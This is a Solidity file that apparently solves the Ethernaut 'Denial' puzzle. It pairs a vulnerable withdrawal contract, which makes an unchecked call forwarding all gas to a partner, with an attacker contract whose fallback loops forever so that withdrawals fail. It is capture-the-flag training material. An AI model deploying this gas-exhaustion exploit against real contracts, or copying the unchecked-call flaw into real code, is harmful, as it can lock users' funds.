// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "hardhat/console.sol";

contract Denile {
    uint256 wasteOfTime;
    Denial target;
    constructor(address _target){
        target = Denial(payable(_target));
        console.log(address(this));
        target.setWithdrawPartner(address(this));
        // (bool succ,) = target.call(abi.encodeWithSignature("setWithdrawPartner(address)", address(this)));
        require(target.partner() == address(this));

    }

    fallback() external payable {
        // (bool succ,) = target.call{gas:gasleft()}(abi.encodeWithSignature("setWithdrawPartner(address)", address(this)));
    console.logUint(gasleft());
    while(true) {}
    }
    
}
contract Denial {

    address public partner; // withdrawal partner - pay the gas, split the withdraw
    address public constant owner = address(0xA9E);
    uint timeLastWithdrawn;
    mapping(address => uint) withdrawPartnerBalances; // keep track of partners balances

    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }

    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        uint amountToSend = address(this).balance / 100;
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        partner.call{value:amountToSend}("");
        console.log("we've failed");
        payable(owner).transfer(amountToSend);
        // keep track of last withdrawal time
        timeLastWithdrawn = block.timestamp;
        withdrawPartnerBalances[partner] +=  amountToSend;
    }

    // allow deposit of funds
    receive() external payable {}

    // convenience function
    function contractBalance() public view returns (uint) {
        return address(this).balance;
    }
}